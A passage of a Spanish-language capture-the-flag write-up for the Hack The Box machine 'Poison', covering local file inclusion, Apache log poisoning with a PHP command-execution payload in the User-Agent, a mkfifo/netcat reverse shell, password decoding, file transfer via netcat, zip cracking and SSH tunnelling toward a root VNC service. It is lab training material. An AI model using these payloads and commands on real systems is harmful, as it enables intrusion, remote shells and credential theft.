&lt;b&gt;Warning&lt;/b&gt;:  include<span class="o">()</span>: Failed opening <span class="s1">'/var/log'</span> <span class="k">for </span>inclusion <span class="o">(</span><span class="nv">include_path</span><span class="o">=</span><span class="s1">'.:/usr/local/www/apache24/data'</span><span class="o">)</span> <span class="k">in</span> &lt;b&gt;/usr/local/www/apache24/data/browse.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;
</code></pre></div></div>

<ul>
  <li>En este caso se esta empleando <code class="language-plaintext highlighter-rouge">FreeBSD</code> y la ruta donde están los logs es en <code class="language-plaintext highlighter-rouge">/var/log/httpd-access.log</code> hay se guardan todas las solicitudes que recibe cada que intentamos interactuar con el servidor o la maquina todo se va a guardar allí si nosotros somos capaces de ver el contenido de ese archivo podemos tratar de hacer un <code class="language-plaintext highlighter-rouge">Log Poisoning</code> que esto lo que hace es envenenar los logs de apache y poder inyectar comandos <a href="https://medium.com/@josewice7/lfi-to-rce-via-log-poisoning-db3e0e7a1cf1">https://medium.com/@josewice7/lfi-to-rce-via-log-poisoning-db3e0e7a1cf1</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/3.png" />
</p>

<ul>
  <li>Vemos que podemos ver el archivo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/4.png" />
</p>

<ul>
  <li>Como la web interpreta <code class="language-plaintext highlighter-rouge">PHP</code> lo que podemos hacer es mediante el <code class="language-plaintext highlighter-rouge">User-Agent</code> inyectar código <code class="language-plaintext highlighter-rouge">PHP</code> para ver si lo interpreta esto lo que va hacer es como vamos a hacerlo mediante <code class="language-plaintext highlighter-rouge">curl</code> por <code class="language-plaintext highlighter-rouge">GET</code> se va a guardar el el <code class="language-plaintext highlighter-rouge">access.log</code> y hay podremos ver si en este caso funciono.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="nt">-GET</span> <span class="s2">"http://10.10.10.84/test"</span> <span class="nt">-H</span> <span class="s2">"User-Agent: &lt;?php system('id'); ?&gt;"</span>
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;501 Not Implemented&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Implemented&lt;/h1&gt;
&lt;p&gt;-GET to /test not supported.&lt;br /&gt;
&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div></div>

<ul>
  <li>Y vemos que como tal fue interpretado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="nt">-GET</span> <span class="s1">'http://10.10.10.84/browse.php?file=/var/log/httpd-access.log'</span> | <span class="nb">tail</span> <span class="nt">-n</span> 10
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:02:11 +0200] <span class="s2">"GET /favicon.ico HTTP/1.1"</span> 404 209 <span class="s2">"http://10.10.10.84/"</span> <span class="s2">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:02:30 +0200] <span class="s2">"-"</span> 408 - <span class="s2">"-"</span> <span class="s2">"-"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:06:50 +0200] <span class="s2">"GET /browse.php?file= HTTP/1.1"</span> 200 321 <span class="s2">"http://10.10.10.84/"</span> <span class="s2">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:07:10 +0200] <span class="s2">"-"</span> 408 - <span class="s2">"-"</span> <span class="s2">"-"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:09:38 +0200] <span class="s2">"GET /browse.php?file=/etc/passwd HTTP/1.1"</span> 200 1894 <span class="s2">"-"</span> <span class="s2">"curl/8.8.0"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:12:58 +0200] <span class="s2">"GET /browse.php?file=/var/log HTTP/1.1"</span> 200 368 <span class="s2">"-"</span> <span class="s2">"curl/8.8.0"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:18:28 +0200] <span class="s2">"GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1"</span> 200 381807 <span class="s2">"-"</span> <span class="s2">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:18:48 +0200] <span class="s2">"-"</span> 408 - <span class="s2">"-"</span> <span class="s2">"-"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:22:19 +0200] <span class="s2">"-GET /test HTTP/1.1"</span> 501 196 <span class="s2">"-"</span> <span class="s2">"uid=80(www) gid=80(www) groups=80(www)
</span></code></pre></div></div>

<h2 id="shell-as-www">Shell as www</h2>

<ul>
  <li>Algo que podemos hacer es que para controlar nosotros el comando podemos inyectar lo siguiente para poder hacerlo mucho mas cómodo mediante el parámetro <code class="language-plaintext highlighter-rouge">cmd</code> nosotros le vamos a pasar el comando.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://10.10.10.84/test"</span> <span class="nt">-H</span> <span class="s2">"User-Agent: &lt;?php system(</span><span class="se">\$</span><span class="s2">_GET['cmd']); ?&gt;"</span>
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /test was not found on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/5.png" />
</p>

<ul>
  <li>Ahora nos vamos a poner en escucha con <code class="language-plaintext highlighter-rouge">netcat</code> para enviarnos una reverse <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...

</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/6.png" />
</p>

<ul>
  <li>
    <p>Si lo enviamos vemos que nos envía nada.</p>
  </li>
  <li>
    <p>Lo mas probable es que tengamos que hacerlo <code class="language-plaintext highlighter-rouge">url-encodeado</code>.</p>
  </li>
  <li>
    <p>Vamos a capturar con <code class="language-plaintext highlighter-rouge">Burpsuite</code> la petición donde vemos el archivo de los logs.</p>
  </li>
  <li>
    <p>Vamos abrirlo en segundo plano e independizamos el proceso.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ burpsuite &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
<span class="o">[</span>1] 35533
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a enviarlo con <code class="language-plaintext highlighter-rouge">mkfifo</code> <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>.</p>
  </li>
  <li>
    <p>Así se ve antes de <code class="language-plaintext highlighter-rouge">url-encodear</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/7.png" />
</p>

<ul>
  <li>Ahora lo <code class="language-plaintext highlighter-rouge">url-encodeamos</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/8.png" />
</p>

<ul>
  <li>
    <p>Ahora le damos a forward para enviar la petición.</p>
  </li>
  <li>
    <p>Nos llega la shell.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.17] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.84] 13393
sh: can<span class="s1">'t access tty; job control turned off
$ whoami
www
$ 
</span></code></pre></div></div>

<ul>
  <li>No nos deja.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
script: <span class="nt">-c</span>: No such file or directory
Script started, output file is /dev/null
Script started, output file is /dev/null

Script <span class="k">done</span>, output file is /dev/null
</code></pre></div></div>

<ul>
  <li>Hay un archivo llamado <code class="language-plaintext highlighter-rouge">pwdbackup.txt</code> por el nombre ya sabemos que es importante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">pwd</span>
/usr/local/www/apache24/data
<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 72
drwxr-xr-x  2 root  wheel   512 Mar 19  2018 <span class="nb">.</span>
drwxr-xr-x  6 root  wheel   512 Jan 24  2018 ..
<span class="nt">-rw-r--r--</span>  1 root  wheel    33 Jan 24  2018 browse.php
<span class="nt">-rw-r--r--</span>  1 root  wheel   289 Jan 24  2018 index.php
<span class="nt">-rw-r--r--</span>  1 root  wheel    27 Jan 24  2018 info.php
<span class="nt">-rw-r--r--</span>  1 root  wheel    33 Jan 24  2018 ini.php
<span class="nt">-rw-r--r--</span>  1 root  wheel    90 Jan 24  2018 listfiles.php
<span class="nt">-rw-r--r--</span>  1 root  wheel    20 Jan 24  2018 phpinfo.php
<span class="nt">-rw-r--r--</span>  1 root  wheel  1267 Mar 19  2018 pwdbackup.txt
</code></pre></div></div>

<ul>
  <li>Y tenemos esto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>pwdbackup.txt
This password is secure, it<span class="s1">'s encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
</span></code></pre></div></div>

<ul>
  <li>Si hacemos un <code class="language-plaintext highlighter-rouge">decode</code> 13 veces obtendremos una contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Q2hhcml4ITIjNCU2JjgoMA=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
Charix!2#4%6&amp;8<span class="o">(</span>0           
</code></pre></div></div>

<h2 id="shell-as-charix">Shell as charix</h2>

<ul>
  <li>Si recordamos tenemos un usuario que se llama <code class="language-plaintext highlighter-rouge">charix</code> y nos podemos conectar por SSH.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh charix@10.10.10.84
The authenticity of host <span class="s1">'10.10.10.84 (10.10.10.84)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:ai75ITo2ASaXyYZVscbEWVbDkh/ev+ClcQsgC6xmlrA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.84<span class="s1">' (ED25519) to the list of known hosts.
(charix@10.10.10.84) Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
Want to see how much virtual memory you'</span>re using? Just <span class="nb">type</span> <span class="s2">"swapinfo"</span> to
be shown information about the usage of your swap partitions.
csh: The terminal database could not be opened.
csh: using dumb terminal settings.
charix@Poison:~ %
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % <span class="nb">cat </span>user.txt 
eaacdfb2d141b72a589233063604209c
charix@Poison:~ % 
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">secret.zip</code> vamos a enviarlo a nuestra maquina de atacante para analizarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> secret.zip
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora lo enviamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % nc 10.10.14.17 443 &lt; secret.zip
</code></pre></div></div>

<ul>
  <li>Vemos que hay un <code class="language-plaintext highlighter-rouge">secret</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ 7z l secret.zip

7-Zip 24.07 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2024 Igor Pavlov : 2024-06-19
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 166 bytes <span class="o">(</span>1 KiB<span class="o">)</span>

Listing archive: secret.zip

<span class="nt">--</span>
Path <span class="o">=</span> secret.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 166

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2018-01-24 11:01:14 .R..A            8           20  secret
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2018-01-24 11:01:14                  8           20  1 files
</code></pre></div></div>

<ul>
  <li>Si hacemos un <code class="language-plaintext highlighter-rouge">unzip</code> nos pide contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip secret.zip
Archive:  secret.zip
<span class="o">[</span>secret.zip] secret password: 
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">zip2john</code> para extraer un hash y posteriormente crackearlo para obtener la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ zip2john secret.zip <span class="o">&gt;</span> <span class="nb">hash
</span>ver 2.0 secret.zip/secret PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>20, <span class="nv">decmplen</span><span class="o">=</span>8, <span class="nv">crc</span><span class="o">=</span>77537827 <span class="nv">ts</span><span class="o">=</span>9827 <span class="nv">cs</span><span class="o">=</span>7753 <span class="nb">type</span><span class="o">=</span>0
</code></pre></div></div>

<ul>
  <li>Y bueno no tenemos suerte por que no esta la contraseña en el <code class="language-plaintext highlighter-rouge">rockyou.txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
0g 0:00:00:12 DONE <span class="o">(</span>2024-09-08 13:06<span class="o">)</span> 0g/s 1188Kp/s 1188Kc/s 1188KC/s <span class="o">!</span>LUVDKR!..<span class="k">*</span>7¡Vamos!
Session completed. 
                            
</code></pre></div></div>

<ul>
  <li>Lo que podemos hacer es reutilizar la contraseña que ya tenemos para ver si con esa funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip secret.zip
Archive:  secret.zip
<span class="o">[</span>secret.zip] secret password: 
 extracting: secret    
</code></pre></div></div>

<ul>
  <li>Pero no vemos gran cosa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn secret
��[|Ֆz!
</code></pre></div></div>

<ul>
  <li>Si enumeramos puertos abiertos internamente vemos los siguientes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % netstat <span class="nt">-na</span> <span class="nt">-p</span> tcp
Active Internet connections <span class="o">(</span>including servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address          Foreign Address        <span class="o">(</span>state<span class="o">)</span>
tcp4       0     44 10.10.10.84.22         10.10.14.17.57266      ESTABLISHED
tcp4       0      0 10.10.10.84.13393      10.10.14.17.443        CLOSE_WAIT
tcp4       0      0 10.10.10.84.80         10.10.14.17.52658      CLOSE_WAIT
tcp4       0      0 127.0.0.1.25           <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp4       0      0 <span class="k">*</span>.80                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp6       0      0 <span class="k">*</span>.80                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp4       0      0 <span class="k">*</span>.22                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp6       0      0 <span class="k">*</span>.22                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp4       0      0 127.0.0.1.5801         <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp4       0      0 127.0.0.1.5901         <span class="k">*</span>.<span class="k">*</span>                    LISTEN
charix@Poison:~ % 
</code></pre></div></div>

<ul>
  <li>Encontramos un proceso interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % ps <span class="nt">-faux</span>
USER   PID  %CPU %MEM    VSZ   RSS TT  STAT STARTED     TIME COMMAND
root    11 100.0  0.0      0    16  -  RL   19:54   72:52.21 <span class="o">[</span>idle]
root     0   0.0  0.0      0   160  -  DLs  19:54    0:00.01 <span class="o">[</span>kernel]
root     1   0.0  0.1   5408  1040  -  ILs  19:54    0:00.00 /sbin/init <span class="nt">--</span>
root     2   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>crypto]
root     3   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>crypto returns]
root     4   0.0  0.0      0    32  -  DL   19:54    0:00.04 <span class="o">[</span>cam]
root     5   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>mpt_recovery0]
root     6   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>sctp_iterator]
root     7   0.0  0.0      0    16  -  DL   19:54    0:00.25 <span class="o">[</span>rand_harvestq]
root     8   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>soaiod1]
root     9   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>soaiod2]
root    10   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>audit]
root    12   0.0  0.1      0   736  -  WL   19:54    0:01.65 <span class="o">[</span>intr]
root    13   0.0  0.0      0    48  -  DL   19:54    0:00.00 <span class="o">[</span>geom]
root    14   0.0  0.0      0   160  -  DL   19:54    0:00.15 <span class="o">[</span>usb]
root    15   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>soaiod3]
root    16   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>soaiod4]
root    17   0.0  0.0      0    48  -  DL   19:54    0:00.07 <span class="o">[</span>pagedaemon]
root    18   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>vmdaemon]
root    19   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>pagezero]
root    20   0.0  0.0      0    32  -  DL   19:54    0:00.04 <span class="o">[</span>bufdaemon]
root    21   0.0  0.0      0    16  -  DL   19:54    0:00.01 <span class="o">[</span>bufspacedaemon]
root    22   0.0  0.0      0    16  -  DL   19:54    0:00.04 <span class="o">[</span>syncer]
root    23   0.0  0.0      0    16  -  DL   19:54    0:00.01 <span class="o">[</span>vnlru]
root   319   0.0  0.5   9560  5052  -  Ss   19:55    0:00.15 /sbin/devd
root   390   0.0  0.2  10500  2452  -  Ss   19:55    0:00.06 /usr/sbin/syslogd <span class="nt">-s</span>
root   543   0.0  0.5  56320  5400  -  S    19:55    0:01.97 /usr/local/bin/vmtoolsd <span class="nt">-c</span> /usr/local/share/vmware-tools/tools.con
root   620   0.0  0.7  57812  7052  -  Is   19:55    0:00.00 /usr/sbin/sshd
root   625   0.0  1.1  99172 11516  -  Ss   19:56    0:00.09 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    637   0.0  1.3 101220 12776  -  I    19:57    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    638   0.0  1.2 101220 12072  -  I    19:57    0:00.01 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    639   0.0  1.2 101220 11952  -  I    19:57    0:00.01 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    640   0.0  1.3 101220 12788  -  I    19:57    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    641   0.0  1.3 101220 12812  -  I    19:57    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
root   642   0.0  0.6  20636  6140  -  Ss   19:57    0:00.05 sendmail: accepting connections <span class="o">(</span>sendmail<span class="o">)</span>
smmsp  645   0.0  0.6  20636  5808  -  Is   19:57    0:00.00 sendmail: Queue runner@00:30:00 <span class="k">for</span> /var/spool/clientmqueue <span class="o">(</span>sendm
root   649   0.0  0.2  12592  2436  -  Is   19:57    0:00.01 /usr/sbin/cron <span class="nt">-s</span>
www    706   0.0  1.2 101220 11952  -  I    19:59    0:00.01 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    708   0.0  1.2 101220 11988  -  S    19:59    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    712   0.0  1.3 101220 12792  -  I    19:59    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    713   0.0  1.2 101220 12140  -  I    19:59    0:00.01 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    783   0.0  0.3  13180  2664  -  I    20:46    0:00.00 sh <span class="nt">-c</span> <span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.
www    786   0.0  0.2   8324  1932  -  I    20:46    0:00.00 <span class="nb">cat</span> /tmp/f
www    787   0.0  0.3  13180  2680  -  I    20:46    0:00.00 /bin/sh <span class="nt">-i</span>
www    788   0.0  0.2  10928  2000  -  I    20:46    0:00.00 nc 10.10.14.17 443
root   807   0.0  0.8  85228  7840  -  Is   20:56    0:00.01 sshd: charix <span class="o">[</span>priv] <span class="o">(</span>sshd<span class="o">)</span>
charix 810   0.0  0.8  85228  7872  -  S    20:56    0:00.01 sshd: charix@pts/1 <span class="o">(</span>sshd<span class="o">)</span>
root   529   0.0  0.9  23620  8868 v0- I    19:55    0:00.02 Xvnc :1 <span class="nt">-desktop</span> X <span class="nt">-httpd</span> /usr/local/share/tightvnc/classes <span class="nt">-auth</span> 
root   540   0.0  0.7  67220  7056 v0- I    19:55    0:00.01 xterm <span class="nt">-geometry</span> 80x24+10+10 <span class="nt">-ls</span> <span class="nt">-title</span> X Desktop
root   541   0.0  0.5  37620  5312 v0- I    19:55    0:00.00 twm
root   696   0.0  0.2  10484  2076 v0  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv0
root   697   0.0  0.2  10484  2076 v1  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv1
root   698   0.0  0.2  10484  2076 v2  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv2
root   699   0.0  0.2  10484  2076 v3  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv3
root   700   0.0  0.2  10484  2076 v4  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv4
root   701   0.0  0.2  10484  2076 v5  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv5
root   702   0.0  0.2  10484  2076 v6  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv6
root   703   0.0  0.2  10484  2076 v7  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv7
root   617   0.0  0.4  19660  3616  0  Is+  19:55    0:00.00 <span class="nt">-csh</span> <span class="o">(</span>csh<span class="o">)</span>
charix 811   0.0  0.4  19660  3796  1  Ss   20:56    0:00.01 <span class="nt">-csh</span> <span class="o">(</span>csh<span class="o">)</span>
charix 837   0.0  0.3  21208  2660  1  R+   21:07    0:00.00 ps <span class="nt">-faux</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos que se esta corriendo <code class="language-plaintext highlighter-rouge">tightvnc</code> ya que el usuario root lo esta corriendo <a href="https://www.tightvnc.com/">https://www.tightvnc.com/</a>.</p>
  </li>
  <li>
    <p>Aquí nos explican como auditar ese servicio <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc">https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ vncviewer
</code></pre></div></div>

<ul>
  <li>Nos tenemos que conectar pero el puerto solo esta abierto internamente así que haremos <code class="language-plaintext highlighter-rouge">port forwarding</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh charix@10.10.10.84 <span class="nt">-D</span> 1080
</code></pre></div></div>

<ul>
  <li>Todo esta funcionando.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ lsof <span class="nt">-i</span>:1080
COMMAND   PID        USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     62161 miguelrega7    4u  IPv6 192426      0t0  TCP localhost:socks <span class="o">(</span>LISTEN<span class="o">)</span>
ssh     62161 miguelrega7    5u  IPv4 192427      0t0  TCP localhost:socks <span class="o">(</span>LISTEN<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora le pasamos lo que nos pide la herramienta.</li>
</ul>

